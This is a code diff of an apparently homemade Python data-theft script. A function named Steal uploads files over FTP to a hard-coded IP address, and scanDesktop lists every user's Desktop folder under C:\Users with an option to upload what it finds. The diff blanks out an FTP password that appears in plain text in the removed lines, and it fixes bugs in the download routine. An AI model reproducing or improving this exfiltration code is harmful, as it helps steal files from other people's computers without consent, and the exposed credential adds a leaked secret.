@@ -6,8 +6,8 @@ import os
 def Steal(filename):
     ip = '172.23.7.161' # insert ip address
     port = 2002
-    username = '' # insert username
-    password = 'tungratog12' # insert password
+    username = '----------------' # insert username
+    password = '-----------------' # insert password
 
     ftp = ftplib.FTP() # annouce FTP object
     ftp.connect(ip, port)
@@ -39,7 +39,7 @@ def Steal(filename):
 # Steal('test.txt')
 
 
-def scanDesktop(paht='Desktop', upload=False):
+def scanDesktop(path='Desktop', upload=False):
     folder_start = r'C:\Users'
     system_folder = ['All Users', 'CAT', 'Default', 'Default User', 'desktop.ini', 'Public']
 
@@ -49,7 +49,7 @@ def scanDesktop(paht='Desktop', upload=False):
         if u not in system_folder:
             try:
                 userpath = os.path.join(folder_start, u)
-                desktop = os.path.join(userpath, 'Desktop')
+                desktop = os.path.join(userpath, path)
                 print('Desktop: ', desktop)
                 print(os.listdir(desktop))
 
@@ -68,11 +68,11 @@ def scanDesktop(paht='Desktop', upload=False):
                 pass
 
 
-def download(filename):
+def download():
     ip = '172.23.7.161' # insert ip address
     port = 2002
-    username = '' # insert username
-    password = 'tungratog12' # insert password
+    username = '-------------' # insert username
+    password = '-------------' # insert password
 
     ftp = ftplib.FTP() # annouce FTP object
     ftp.connect(ip, port)
@@ -83,8 +83,8 @@ def download(filename):
     mypath = '/home/dimon/Documents/' # insert path from server
     ftp.cwd(mypath) # change working directory
 
-    with open('uploadlist-local.txt', 'wb') as fp:
-        ftp.retrbinary('RETR up uploadfile.txt', fp.write())
+    with open('uploadfile-local.txt', 'wb') as fp:
+        ftp.retrbinary('RETR uploadfile.txt', fp.write)
 
     ftp.close()
 
